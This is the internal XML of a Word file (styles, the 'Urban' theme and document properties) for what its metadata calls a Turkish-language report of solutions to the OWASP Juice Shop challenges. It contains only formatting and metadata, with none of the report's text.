    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24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580F3F796259414FAC801F41ECA0027B">
    <w:name w:val="580F3F796259414FAC801F41ECA0027B"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="D8E4383E5E1245EAB6C8C714FFEACEEC">
    <w:name w:val="D8E4383E5E1245EAB6C8C714FFEACEEC"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="2CA848442B984E49B7C3F6BD29A9AEA2">
    <w:name w:val="2CA848442B984E49B7C3F6BD29A9AEA2"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="B5C07757C45C49DD9A1219EB6D24B3CF">
    <w:name w:val="B5C07757C45C49DD9A1219EB6D24B3CF"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="C504DB3BDF6E4C90A23E7E88D7DA8DAE">
    <w:name w:val="C504DB3BDF6E4C90A23E7E88D7DA8DAE"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="4D883651C68B425BA766D5D2A6C75F70">
    <w:name w:val="4D883651C68B425BA766D5D2A6C75F70"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk1Char">
    <w:name w:val="Başlık 1 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk1"/>
    <w:uiPriority w:val="1"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk2Char">
    <w:name w:val="Başlık 2 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk2"/>
    <w:uiPriority w:val="2"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Balk3Char">
    <w:name w:val="Başlık 3 Char"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:link w:val="Balk3"/>
    <w:uiPriority w:val="2"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="minorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="minorHAnsi"/>
      <w:color w:val="ED7D31" w:themeColor="accent2"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="649C6F47E6D24888B8C0A860F02248C5">
    <w:name w:val="649C6F47E6D24888B8C0A860F02248C5"/>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="E0C712CC55604BACAA828466784A1724">
    <w:name w:val="E0C712CC55604BACAA828466784A1724"/>
    <w:rsid w:val="00FC4C7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1.jpeg"/></Relationships>
</file>

<file path=word/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Urban">
  <a:themeElements>
    <a:clrScheme name="Urban">
      <a:dk1>
        <a:sysClr val="windowText" lastClr="000000"/>
      </a:dk1>
      <a:lt1>
        <a:sysClr val="window" lastClr="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="424456"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="DEDEDE"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="53548A"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="438086"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="A04DA3"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="C4652D"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="8B5D3D"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="5C92B5"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="67AFBD"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="C2A874"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Urban">
      <a:majorFont>
        <a:latin typeface="Trebuchet MS"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
        <a:font script="Jpan" typeface="HGｺﾞｼｯｸM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Georgia"/>
        <a:ea typeface=""/>
        <a:cs typeface=""/>
        <a:font script="Jpan" typeface="HG明朝B"/>
        <a:font script="Hang" typeface="맑은 고딕"/>
        <a:font script="Hans" typeface="宋体"/>
        <a:font script="Hant" typeface="新細明體"/>
        <a:font script="Arab" typeface="Arial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Urban">
      <a:fillStyleLst>
        <a:solidFill>
          <a:schemeClr val="phClr"/>
        </a:solidFill>
        <a:gradFill rotWithShape="1">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="phClr">
                <a:tint val="1000"/>
                <a:satMod val="255000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="55000">
              <a:schemeClr val="phClr">
                <a:tint val="12000"/>
                <a:satMod val="255000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="phClr">
                <a:tint val="45000"/>
                <a:satMod val="250000"/>
              </a:schemeClr>
            </a:gs>
          </a:gsLst>
          <a:path path="circle">
            <a:fillToRect l="100000" r="280000" b="280000"/>
          </a:path>
        </a:gradFill>
        <a:gradFill rotWithShape="1">
          <a:gsLst>
            <a:gs pos="0">
              <a:schemeClr val="phClr">
                <a:tint val="43000"/>
                <a:satMod val="165000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="55000">
              <a:schemeClr val="phClr">
                <a:tint val="83000"/>
                <a:satMod val="155000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="100000">
              <a:schemeClr val="phClr">
                <a:shade val="85000"/>
              </a:schemeClr>
            </a:gs>
          </a:gsLst>
          <a:path path="circle">
            <a:fillToRect l="100000" r="280000" b="28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3175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1500" dist="254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50800" dist="25400" dir="5400000" rotWithShape="0">
              <a:srgbClr val="000000">
                <a:alpha val="45000"/>
              </a:srgbClr>
            </a:outerShdw>
          </a:effectLst>
          <a:scene3d>
            <a:camera prst="orthographicFront" fov="0">
              <a:rot lat="0" lon="0" rev="0"/>
            </a:camera>
            <a:lightRig rig="flat" dir="t">
              <a:rot lat="0" lon="0" rev="20040000"/>
            </a:lightRig>
          </a:scene3d>
          <a:sp3d contourW="12700" prstMaterial="dkEdge">
            <a:bevelT w="25400" h="38100" prst="convex"/>
            <a:contourClr>
              <a:schemeClr val="phClr">
                <a:satMod val="115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100000">
              <a:schemeClr val="phClr">
                <a:tint val="80000"/>
                <a:satMod val="250000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="60000">
              <a:schemeClr val="phClr">
                <a:shade val="38000"/>
                <a:satMod val="175000"/>
              </a:schemeClr>
            </a:gs>
            <a:gs pos="0">
              <a:schemeClr val="phClr">
                <a:shade val="30000"/>
                <a:satMod val="175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48000"/>
              </a:schemeClr>
              <a:schemeClr val="phClr">
                <a:tint val="96000"/>
                <a:satMod val="150000"/>
              </a:schemeClr>
            </a:duotone>
          </a:blip>
          <a:tile tx="0" ty="0" sx="80000" sy="8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2019-12-09T00:00:00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outs:outSpaceData xmlns:outs="http://schemas.microsoft.com/office/2009/outspace/metadata">
  <outs:relatedDates/>
  <outs:relatedDocuments/>
  <outs:relatedPeople/>
  <propertyMetadataList xmlns="http://schemas.microsoft.com/office/2009/outspace/metadata"/>
  <outs:corruptMetadataWasLost/>
</outs:outSpaceDat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AFFEC33-7885-48B1-BE46-70062FA6D7B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12CF13-A6E2-4B52-A065-C287D308AFEB}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2009/outspace/meta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Rapor (Şehir Hayatı teması).dotx</Template>
  <TotalTime>694</TotalTime>
  <Pages>15</Pages>
  <Words>2411</Words>
  <Characters>13743</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>114</Lines>
  <Paragraphs>32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OWASP-JUICE SHOP</vt:lpstr>
      <vt:lpstr/>
    </vt:vector>
  </TitlesOfParts>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>16122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OWASP-JUICE SHOP</dc:title>
  <dc:subject>Challangeların Çözümü</dc:subject>
  <dc:creator>Muhammed Said Bakırcı</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>Muhammed Said Bakırcı</cp:lastModifiedBy>
  <cp:revision>160</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-12-10T11:50:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-12-13T17:19:00Z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TC017730899991</vt:lpwstr>
  </property>
</Properties>
</file>